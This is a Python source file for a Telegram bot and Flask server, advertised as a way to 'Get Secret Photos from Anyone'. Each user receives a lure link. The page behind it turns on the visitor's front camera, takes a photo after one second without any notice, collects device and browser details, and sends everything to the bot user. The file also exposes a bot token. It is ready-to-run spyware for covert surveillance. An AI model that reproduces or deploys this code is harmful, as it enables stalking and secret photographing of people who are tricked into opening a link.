import logging
import sqlite3
import uuid
import base64
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import requests

# Telegram bot imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Configuration
BOT_TOKEN = "8023404614:AAHu0jfYv-A0roqDoCbamEQ_W2lY-qkDpI0"
FLASK_URL = "https://imgs-sharing.onrender.com"

# Database setup
def init_db():
    conn = sqlite3.connect('users.db', check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            referral_code TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id INTEGER,
            visitor_ip TEXT,
            photo_data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# Setup logging
logging.basicConfig(
    format='%(asasctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== TELEGRAM BOT FUNCTIONS ====================

def get_user_referral_code(user_id):
    conn = sqlite3.connect('users.db', check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute('SELECT referral_code FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if not result:
        referral_code = str(uuid.uuid4())[:8]
        cursor.execute(
            'INSERT OR REPLACE INTO users (user_id, referral_code) VALUES (?, ?)',
            (user_id, referral_code)
        )
        conn.commit()
    else:
        referral_code = result[0]
    
    conn.close()
    return referral_code

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username
        first_name = update.effective_user.first_name
        
        logger.info(f"User {user_id} started the bot")
        
        # Create or get user
        referral_code = get_user_referral_code(user_id)
        
        # Generate unique link
        photo_capture_link = f"{FLASK_URL}/{referral_code}"
        
        welcome_message = f"""
👋 **Welcome {first_name}!**

📸 **Get Secret Photos from Anyone**

🎯 **How it works:**
1. Share your unique link with anyone
2. When they click the link, their photo will be automatically captured
3. You'll receive their photo here instantly!

🔗 **Your Unique Link:**
`{photo_capture_link}`

📤 **Share this link and get photos!**
"""
        
        keyboard = [
            [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={photo_capture_link}&text=📸 Check this amazing photo sharing link!")],
            [InlineKeyboardButton("🔄 New Link", callback_data="new_link")],
            [InlineKeyboardButton("📊 My Photos", callback_data="my_photos")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        await update.message.reply_text("❌ Error occurred. Please try again.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if query.data == "new_link":
            # Generate new referral code
            new_code = str(uuid.uuid4())[:8]
            
            conn = sqlite3.connect('users.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('UPDATE users SET referral_code = ? WHERE user_id = ?', (new_code, user_id))
            conn.commit()
            conn.close()
            
            new_link = f"{FLASK_URL}/{new_code}"
            
            keyboard = [
                [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={new_link}&text=📸 Check this amazing photo sharing link!")],
                [InlineKeyboardButton("📊 My Photos", callback_data="my_photos")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"🆕 **New Link Generated!**\n\n🔗 Your new link:\n`{new_link}`",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        
        elif query.data == "my_photos":
            conn = sqlite3.connect('users.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM photos WHERE referrer_id = ?', (user_id,))
            photo_count = cursor.fetchone()[0]
            conn.close()
            
            keyboard = [
                [InlineKeyboardButton("🔄 New Link", callback_data="new_link")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"📊 **Your Photo Stats**\n\n📸 Total Photos Received: {photo_count}",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        
        elif query.data == "main_menu":
            referral_code = get_user_referral_code(user_id)
            photo_capture_link = f"{FLASK_URL}/{referral_code}"
            
            keyboard = [
                [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={photo_capture_link}&text=📸 Check this amazing photo sharing link!")],
                [InlineKeyboardButton("🔄 New Link", callback_data="new_link")],
                [InlineKeyboardButton("📊 My Photos", callback_data="my_photos")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"🏠 **Main Menu**\n\n🔗 Your current link:\n`{photo_capture_link}`",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"Error in button handler: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🤖 **Photo Capture Bot Help**

📸 **Commands:**
/start - Start the bot and get your unique link
/help - Show this help message

🎯 **How to use:**
1. Use /start to get your unique link
2. Share the link with anyone
3. When they click the link, their photo will be automatically captured
4. You'll receive the photo here instantly!

🔒 **Privacy:**
- Photos are sent only to you
- Camera access is required for the feature to work
"""
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

def start_telegram_bot():
    """Start Telegram bot in a separate thread"""
    try:
        # Create application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CallbackQueryHandler(button_handler))
        
        logger.info("🤖 Telegram Bot is starting...")
        print("🤖 Photo Capture Bot Started!")
        print(f"🔑 Bot Token: {BOT_TOKEN}")
        print(f"🌐 Flask URL: {FLASK_URL}")
        print("📸 Bot is ready to receive commands!")
        
        # Start polling
        application.run_polling()
        
    except Exception as e:
        logger.error(f"Failed to start Telegram bot: {e}")
        print(f"❌ Error starting Telegram bot: {e}")

# ==================== FLASK WEB SERVER ====================

app = Flask(__name__)

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Photo Sharing Service</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                text-align: center;
                max-width: 500px;
            }
            h1 {
                color: #333;
                margin-bottom: 20px;
            }
            p {
                color: #666;
                margin-bottom: 30px;
                line-height: 1.6;
            }
            .btn {
                background: #2563eb;
                color: white;
                padding: 12px 30px;
                border: none;
                border-radius: 25px;
                text-decoration: none;
                display: inline-block;
                margin: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📸 Photo Sharing Service</h1>
            <p>This service works with Telegram bot. Use the bot to get your unique photo capture link.</p>
            <a href="https://t.me/RajakCamH4ckk_Bot" class="btn">Start Telegram Bot</a>
        </div>
    </body>
    </html>
    """

@app.route('/<referral_code>')
def capture_photo(referral_code):
    html_content = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Sharing</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: #111;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 400px;
            width: 100%;
        }}
        #camera {{
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            margin: 10px 0;
        }}
        .loading {{
            color: #2563eb;
            margin: 10px 0;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <video id="camera" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        
        <div class="loading" id="loading" style="display:none;">
            Processing...
        </div>
    </div>

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const loading = document.getElementById('loading');
        
        // Get visitor information
        function getVisitorInfo() {{
            return {{
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${{screen.width}}x${{screen.height}}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direct'
            }};
        }}
        
        // Start camera automatically
        async function startCamera() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ 
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 480 }}
                    }} 
                }});
                video.srcObject = stream;
                
                // Wait for video to load
                video.onloadedmetadata = () => {{
                    // Capture photo after 1 second automatically
                    setTimeout(() => {{
                        capturePhoto();
                    }}, 1000);
                }};
                
            }} catch (err) {{
                console.error('Camera error:', err);
            }}
        }}
        
        function capturePhoto() {{
            loading.style.display = 'block';
            
            // Set canvas dimensions same as video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Draw video frame to canvas
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to base64
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Stop camera
            if (video.srcObject) {{
                video.srcObject.getTracks().forEach(track => track.stop());
            }}
            
            // Send photo to server
            sendPhotoToServer(photoData);
        }}
        
        function sendPhotoToServer(photoData) {{
            const visitorInfo = getVisitorInfo();
            
            fetch('/save_photo', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                }},
                body: JSON.stringify({{
                    referral_code: '{referral_code}',
                    photo_data: photoData,
                    visitor_info: visitorInfo
                }})
            }})
            .then(response => response.json())
            .then(data => {{
                if (data.success) {{
                    loading.style.display = 'none';
                    // No success message shown to user
                }} else {{
                    throw new Error('Failed to save photo');
                }}
            }})
            .catch(error => {{
                console.error('Error:', error);
                loading.style.display = 'none';
            }});
        }}
        
        // Start camera when page loads
        window.addEventListener('load', startCamera);
    </script>
</body>
</html>
'''
    return html_content

@app.route('/save_photo', methods=['POST'])
def save_photo():
    try:
        data = request.json
        referral_code = data.get('referral_code')
        photo_data = data.get('photo_data')
        visitor_info = data.get('visitor_info')
        
        logger.info(f"📸 Photo received for referral code: {referral_code}")
        
        # Get referrer user_id from database
        conn = sqlite3.connect('users.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users WHERE referral_code = ?', (referral_code,))
        result = cursor.fetchone()
        
        if result:
            referrer_id = result[0]
            
            # Save photo to database
            cursor.execute(
                'INSERT INTO photos (referrer_id, visitor_ip, photo_data) VALUES (?, ?, ?)',
                (referrer_id, str(visitor_info), photo_data)
            )
            conn.commit()
            
            # Send photo to Telegram bot
            send_photo_to_telegram(referrer_id, photo_data, visitor_info)
            
            conn.close()
            return jsonify({'success': True, 'message': 'Photo saved and sent'})
        else:
            conn.close()
            return jsonify({'success': False, 'message': 'Invalid referral code'})
            
    except Exception as e:
        logger.error(f"❌ Error saving photo: {e}")
        return jsonify({'success': False, 'message': str(e)})

def send_photo_to_telegram(user_id, photo_data, visitor_info):
    try:
        # Remove data:image/jpeg;base64, prefix
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        
        # Decode base64 to bytes
        photo_bytes = base64.b64decode(photo_data)
        
        # Send to Telegram using bot API
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        
        caption = f"""
📸 **New Photo Captured!**

🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 Platform: {visitor_info.get('platform', 'Unknown')}
🖥️ Screen: {visitor_info.get('screen', 'Unknown')}
🌍 Language: {visitor_info.get('language', 'Unknown')}
        """
        
        # Prepare files and data
        files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
        data = {'chat_id': user_id, 'caption': caption}
        
        # Send request
        response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            logger.info(f"✅ Photo sent to user {user_id}")
        else:
            logger.error(f"❌ Failed to send photo: {response.text}")
        
    except Exception as e:
        logger.error(f"❌ Error sending to Telegram: {e}")

def start_flask_server():
    """Start Flask server"""
    try:
        logger.info("🚀 Starting Flask server...")
        print("🌐 Flask Server Starting...")
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"Failed to start Flask server: {e}")
        print(f"❌ Error starting Flask server: {e}")

# ==================== MAIN EXECUTION ====================

if __name__ == '__main__':
    print("🚀 Starting Photo Capture System...")
    print("🤖 Starting Telegram Bot...")
    print("🌐 Starting Flask Server...")
    
    # Start Flask server in a separate thread
    flask_thread = threading.Thread(target=start_flask_server)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Wait a moment for Flask to start
    import time
    time.sleep(2)
    
    # Start Telegram bot in main thread
    start_telegram_bot()